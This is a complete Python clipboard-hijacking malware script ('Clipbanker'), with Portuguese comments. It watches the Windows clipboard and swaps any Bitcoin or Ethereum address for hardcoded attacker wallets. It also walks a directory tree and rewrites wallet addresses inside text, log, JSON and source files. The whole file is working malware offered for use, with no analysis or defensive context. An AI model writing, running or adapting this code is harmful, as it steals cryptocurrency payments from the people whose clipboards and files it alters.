# File: crypto_threats/clipbanker.py
import os
import re
import time
import threading
import win32clipboard
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.live import Live

# Console setup
console = Console()

# Carteiras de destino (ataque)
TARGET_WALLETS = {
    "btc": "bc1q4g636c8qlqpazkxc73zeudsn4e52mysycfmfwm",
    "eth": "0x4FB2b1d8092f68cBcBd731Df2781B2A8E5d2cBfA"
}

# Padrões realistas
BTC_REGEX = re.compile(r"\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b")
ETH_REGEX = re.compile(r"\b0x[a-fA-F0-9]{40}\b")
FILE_EXTS = re.compile(r".*\.(txt|log|md|json|js|py)$", re.IGNORECASE)

# Estatísticas
stats = {"btc": 0, "eth": 0, "files_scanned": 0, "replacements": 0}

# ===== Helpers Clipboard =====
def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        return data or ""
    except Exception:
        return ""

def set_clipboard(text: str):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
    except Exception:
        pass

# ===== Substituição =====
def replace_text(text: str) -> str:
    def _repl(match):
        addr = match.group(0)
        if BTC_REGEX.match(addr):
            stats["btc"] += 1
            stats["replacements"] += 1
            console.log(f"[red]BTC hijack:[/red] {addr} -> {TARGET_WALLETS['btc']}")
            return TARGET_WALLETS['btc']
        elif ETH_REGEX.match(addr):
            stats["eth"] += 1
            stats["replacements"] += 1
            console.log(f"[yellow]ETH hijack:[/yellow] {addr} -> {TARGET_WALLETS['eth']}")
            return TARGET_WALLETS['eth']
        return addr
    # first ETH then BTC to avoid overlap
    text = ETH_REGEX.sub(_repl, text)
    return BTC_REGEX.sub(_repl, text)

# ===== Scan Clipboard Thread =====
def scan_clipboard(interval: float = 1.0):
    last = ""
    while True:
        current = get_clipboard()
        if current != last:
            last = current
            new = replace_text(current)
            if new != current:
                set_clipboard(new)
        time.sleep(interval)

# ===== Scan Files Thread =====
def scan_files(root: str):
    for dirpath, _, files in os.walk(root):
        for fname in files:
            if FILE_EXTS.match(fname):
                stats['files_scanned'] += 1
                path = os.path.join(dirpath, fname)
                try:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    new = replace_text(content)
                    if new != content:
                        with open(path, 'w', encoding='utf-8') as f:
                            f.write(new)
                        console.log(f"[green]Replaced in file:[/green] {path}")
                except Exception as e:
                    console.log(f"[yellow]Skip {path}: {e}[/yellow]")

# ===== Exibição de Estatísticas =====
def show_stats():
    console.rule("[bold]Clipbanker Summary[/bold]")
    table = Table(show_header=True)
    table.add_column("Metric")
    table.add_column("Count", justify="right")
    for k, v in stats.items():
        table.add_row(k, str(v))
    console.print(table)

# ===== Main =====
def main(target_dir: str = '.', clip_interval: float = 1.0):
    console.clear()
    console.rule("[bold red]Clipbanker Started[/bold red]")
    # threads
    t1 = threading.Thread(target=scan_clipboard, args=(clip_interval,), daemon=True)
    t2 = threading.Thread(target=scan_files, args=(target_dir,), daemon=True)
    t1.start()
    t2.start()
    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        show_stats()
        console.print("[bold]Exiting Clipbanker[/bold]")

if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser(description="Clipbanker: hijack de wallets em clipboard e arquivos")
    p.add_argument('--dir', default='.', help='Diretório alvo para scan de arquivos')
    p.add_argument('--interval', type=float, default=1.0, help='Intervalo clipboard (s)')
    args = p.parse_args()
    main(args.dir, args.interval)
